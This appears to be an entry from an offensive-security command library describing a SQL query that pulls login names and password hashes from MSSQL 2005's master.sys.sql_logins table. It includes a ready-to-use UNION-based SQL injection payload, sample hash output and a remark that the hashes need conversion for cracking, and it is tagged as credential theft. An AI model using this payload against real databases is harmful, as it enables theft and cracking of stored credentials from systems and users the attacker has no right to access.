---
id: db0b66f1-54bc-48a0-bc35-f56c44cb9471
name: mssql-2005-select-name-password-hash-sql-logins
type: command
executor: sql
data: 'SELECT name, password_hash FROM master.sys.sql_logins'
output: null
created_at: '2023-04-06T03:56:33.738217+00:00'
updated_at: '2023-04-10T20:22:43.467446+00:00'
platforms:
  - Windows
tags:
  - mssql
  - credential-theft
verified: true
validated: true
---

# mssql-2005-select-name-password-hash-sql-logins

## Command

```sql
SELECT name, password_hash FROM master.sys.sql_logins
```

## Description

Queries the sys.sql_logins table in MSSQL 2005 to fetch SQL login names and their password hashes (varbinary). Use in SQL injection scenarios to access SQL-authenticated user credentials.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | No parameters; inject as-is. | N/A |

## Examples

### Basic Usage

`' UNION SELECT name, password_hash FROM master.sys.sql_logins --`

## Expected Output

name | password_hash
---|---
sa | 0x010500000000000015000000...
user1 | 0x020500000000000015000000...

Varbinary hashes require conversion for cracking.

## Related

- [[procedures/MSSQL-Credential-Theft-via-SQL-Injection]]
- [[commands/mssql-2005-select-name-hex-password-hash-sql-logins]]
